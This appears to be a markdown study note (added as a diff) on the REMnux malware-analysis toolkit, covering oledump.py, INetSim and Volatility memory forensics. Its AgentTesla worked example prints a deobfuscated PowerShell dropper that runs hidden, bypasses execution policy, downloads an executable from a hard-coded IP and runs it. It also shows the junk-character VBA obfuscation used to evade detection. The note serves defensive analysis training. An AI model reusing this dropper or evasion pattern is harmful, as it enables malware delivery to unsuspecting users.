@@ -1,0 +1,218 @@
+# REMnux
+
+## 🐧 Overview
+
+**REMnux** is a Linux distribution purpose-built for reverse engineering and malware analysis. It comes pre-loaded with a curated toolkit so analysts can get straight to work without manual setup.
+
+**Key tools included:**
+
+| Tool | Purpose |
+|------|---------|
+| **Volatility** | Memory forensics — analyse RAM dumps |
+| **YARA** | Pattern-matching rules for malware identification |
+| **Wireshark** | Network traffic capture and analysis |
+| **oledump.py** | OLE2 file analysis — extract and inspect macros |
+| **INetSim** | Fake internet simulation — safe network environment for dynamic analysis |
+
+---
+
+## 📄 oledump.py
+
+A file analysis tool for inspecting **OLE2 files** — the format used by older Microsoft Office documents (`.xls`, `.doc`, `.xlsm`, etc.) to store multiple data streams, including embedded macros, within a single file.
+
+### Commands
+
+| Command | Description |
+|---------|-------------|
+| `oledump.py fileName` | List all data streams inside the OLE2 file |
+| `oledump.py fileName -s <N>` | Inspect stream number N |
+| `oledump.py fileName -s <N> --vbadecompress` | Decompress and display a VBA macro from stream N |
+
+### Reading the Output
+
+| Indicator | Meaning |
+|-----------|---------|
+| `A` | Embedded file (e.g. `xl/vbaProject.bin`) |
+| `A1`, `A2`, … | Numbered data streams within the file |
+| `m` (lowercase) | Stream contains a **macro** (small/simple) |
+| `M` (uppercase) | Stream contains a **macro** — more significant, priority to investigate |
+
+> **Tip:** Use CyberChef alongside oledump — paste raw or obfuscated macro output into CyberChef to decode, deobfuscate, or extract IOCs.
+
+---
+
+### 🔬 Worked Example — AgentTesla
+
+**Step 1 — List streams:**
+```bash
+oledump.py agenttesla.xlsm
+```
+
+```
+A:  xl/vbaProject.bin
+A1:       468  'PROJECT'
+A2:        62  'PROJECTwm'
+A3: m     169  'VBA/Sheet1'
+A4: M     688  'VBA/ThisWorkbook'   ← macro flagged here
+A5:         7  'VBA/_VBA_PROJECT'
+A6:       209  'VBA/dir'
+```
+
+`A4` is flagged with `M` — this is the stream to investigate.
+
+**Step 2 — Decompress the macro:**
+```bash
+oledump.py agenttesla.xlsm -s 4 --vbadecompress
+```
+
+This reveals a VBA script inside `Workbook_Open()` — meaning **it runs automatically when the document is opened**. The script contains an obfuscated string with `*` and `^` characters inserted to break pattern matching:
+
+```vba
+Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* ..."
+Sqtnew = Replace(Sqtnew, "*", "")
+Sqtnew = Replace(Sqtnew, "^", "")
+```
+
+**Step 3 — Deobfuscate in CyberChef:**
+
+Use the **Find/Replace** operation (set to *Simple string*, *Global match*) twice — once to strip `*`, once to strip `^`.
+
+Cleaned result:
+```powershell
+powershell -WindowStyle hidden -executionpolicy bypass;
+$TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } -PassThru;
+Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" -OutFile $TempFile;
+Start-Process $TempFile;
+```
+
+**Analysis:**
+
+| Step | What Happens |
+|------|-------------|
+| 1 | Document opens → `Workbook_Open()` macro fires automatically |
+| 2 | PowerShell launches hidden (no visible window) with execution policy bypassed |
+| 3 | Creates a temp file, renames it from `.tmp` to `.exe` |
+| 4 | Downloads `Doc-3737122pdf.exe` from `http://193.203.203.67/rt/` |
+| 5 | Executes the downloaded binary |
+
+> **Why the obfuscation?** Inserting junk characters (`*`, `^`) into the PowerShell command breaks signature-based detection tools that scan for known strings like `powershell` or `Invoke-WebRequest`. The `Replace()` calls reconstruct the real command at runtime — a classic early-stage evasion technique.
+
+---
+
+## 🌐 INetSim — Internet Services Simulation Suite
+
+**INetSim** creates a fake network environment that mimics real internet services (HTTP, DNS, SMTP, etc.). This allows you to safely run malware and observe its network behaviour without any real internet access or risk of exfiltration.
+
+### Configuration
+
+```bash
+# Step 1 — Check the machine's IP address
+ifconfig
+
+# Step 2 — Edit the config file
+sudo nano /etc/inetsim/inetsim.conf
+
+# Step 3 — Find the dns_default_ip line, uncomment it, and set it to your machine's IP
+# Change:  #dns_default_ip   0.0.0.0
+# To:       dns_default_ip   <your_machine_ip>
+# Save: Ctrl+O, then Enter, then Ctrl+X
+
+# Step 4 — Verify the change
+cat /etc/inetsim/inetsim.conf | grep dns_default_ip
+
+# Step 5 — Start INetSim
+sudo inetsim
+```
+
+> Confirm you see **"Simulation running"** at the bottom of the output before proceeding.
+
+**Access the INetSim homepage:** navigate to `https://<your_machine_ip>` in a browser.
+
+### Commands
+
+| Command | Description |
+|---------|-------------|
+| `sudo wget https://<ip>/file.zip --no-check-certificate` | Mimic malware downloading a binary or script from a remote server |
+| `sudo cat /var/log/inetsim/report/report.<id>.txt` | Read the report automatically generated by INetSim after a session |
+
+> **Reports** log all simulated connections — useful for documenting what a malware sample tried to contact, what it downloaded, and which protocols it used.
+
+---
+
+## 🧠 Volatility
+
+**Volatility** is the industry-standard open source tool for **memory forensics**. It analyses RAM dumps (`.mem`, `.raw`, `.dmp`) to extract artifacts that would not appear in a static file analysis — running processes, loaded DLLs, network connections, injected code, and more.
+
+> Volatility is used to **preprocess evidence** — running plugins and saving results to `.txt` or `.json` files for further investigation.
+
+```bash
+# Gain superuser access first
+sudo su
+
+# Base command structure — place before every plugin
+vol3 -f wcry.mem <plugin>
+```
+
+---
+
+### 🔌 Plugins
+
+Full plugin reference: https://volatility3.readthedocs.io/en/stable/volatility3.plugins.html
+
+| Plugin | Command | What It Does |
+|--------|---------|--------------|
+| **PsTree** | `vol3 -f wcry.mem windows.pstree.PsTree` | Lists processes as a tree — shows parent/child relationships (useful for spotting unusual spawning) |
+| **PsList** | `vol3 -f wcry.mem windows.pslist.PsList` | Lists all currently active processes |
+| **PsScan** | `vol3 -f wcry.mem windows.psscan.PsScan` | Scans for process structures in memory — can find hidden or terminated processes that PsList misses |
+| **CmdLine** | `vol3 -f wcry.mem windows.cmdline.CmdLine` | Shows command line arguments for each process — reveals how processes were launched |
+| **FileScan** | `vol3 -f wcry.mem windows.filescan.FileScan` | Scans for file objects in the memory image |
+| **DllList** | `vol3 -f wcry.mem windows.dlllist.DllList` | Lists loaded DLLs for each process — abnormal DLLs can indicate injection |
+| **Malfind** | `vol3 -f wcry.mem windows.malfind.Malfind` | Identifies memory regions with suspicious characteristics (RWX permissions, injected shellcode, etc.) |
+
+> **PsList vs PsScan:** PsList reads from the active process list — malware can unlink itself to hide. PsScan scans raw memory for process structures and finds hidden processes. Always run both.
+
+---
+
+### ⚡ Bulk Processing
+
+Run all plugins in a single command and save each result to its own file:
+
+```bash
+for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do
+    vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt
+done
+```
+
+| Component | Description |
+|-----------|-------------|
+| `$plugin` | Variable that iterates over each plugin name in the list |
+| `-q` | Quiet mode — suppresses progress output in the terminal |
+| `-f wcry.mem` | Reads from the memory capture file |
+| `> wcry.$plugin.txt` | Saves output to a file named `wcry.<plugin_name>.txt` |
+
+Output files are created in the directory where the command is run.
+
+---
+
+### 🔤 Preprocessing with Strings
+
+Extract printable strings from the raw memory image using the Linux `strings` utility — useful for finding URLs, file paths, registry keys, and other IOCs before running plugins:
+
+```bash
+# Extract ASCII strings
+strings wcry.mem > wcry.strings.ascii.txt
+
+# Extract 16-bit little-endian Unicode strings (common in Windows)
+strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt
+
+# Extract 16-bit big-endian Unicode strings
+strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt
+```
+
+| File | Encoding | Notes |
+|------|----------|-------|
+| `wcry.strings.ascii.txt` | ASCII | Standard printable characters |
+| `wcry.strings.unicode_little_endian.txt` | UTF-16 LE | Most common on Windows — process names, paths, registry keys |
+| `wcry.strings.unicode_big_endian.txt` | UTF-16 BE | Less common — worth checking for completeness |
+
+> **Why preprocess with strings?** Running `strings` is fast and catches low-hanging fruit — hardcoded IPs, domains, file paths, and error messages — before investing time in individual plugin runs.
